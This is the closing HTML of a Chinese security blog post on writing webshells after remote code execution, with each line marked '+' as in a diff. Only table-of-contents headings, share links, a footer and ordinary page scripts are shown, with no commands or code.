class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#场景一"><span class="toc-number">4.1.</span> <span class="toc-text">场景一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景二"><span class="toc-number">4.2.</span> <span class="toc-text">场景二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景三"><span class="toc-number">4.3.</span> <span class="toc-text">场景三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景四"><span class="toc-number">4.4.</span> <span class="toc-text">场景四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">5.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#场景一-1"><span class="toc-number">5.1.</span> <span class="toc-text">场景一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景二-1"><span class="toc-number">5.2.</span> <span class="toc-text">场景二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景三-1"><span class="toc-number">5.3.</span> <span class="toc-text">场景三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景四-1"><span class="toc-number">5.4.</span> <span class="toc-text">场景四</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Certutil编码上传Webshell"><span class="toc-number">5.5.</span> <span class="toc-text">Certutil编码上传Webshell</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips-2"><span class="toc-number"></span> <span class="toc-text">Tips-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips-3"><span class="toc-number"></span> <span class="toc-text">Tips-3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips-4"><span class="toc-number"></span> <span class="toc-text">Tips-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux查找某个文件并写入个新文件"><span class="toc-number">1.</span> <span class="toc-text">linux查找某个文件并写入个新文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux下base64编码写shell"><span class="toc-number"></span> <span class="toc-text">linux下base64编码写shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux下base64命令加解密"><span class="toc-number"></span> <span class="toc-text">linux下base64命令加解密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-查找某个文件并写入个新文件"><span class="toc-number"></span> <span class="toc-text">windows 查找某个文件并写入个新文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一步"><span class="toc-number"></span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#先查找c盘上所有叫-1-jpg-的文件，然后把base64编码内容写入到-base64-hm-test-txt-文件里面"><span class="toc-number"></span> <span class="toc-text">先查找c盘上所有叫 1.jpg 的文件，然后把base64编码内容写入到 base64-hm-test.txt 文件里面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第二步"><span class="toc-number"></span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#在找到第一步写入的文件，进行base64解码以后进行二次写马"><span class="toc-number"></span> <span class="toc-text">在找到第一步写入的文件，进行base64解码以后进行二次写马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-base64编码写shell"><span class="toc-number"></span> <span class="toc-text">windows base64编码写shell</span></a>
+    </li></div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/11/10/RCE写shell总结/RCE写shell姿势总结/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
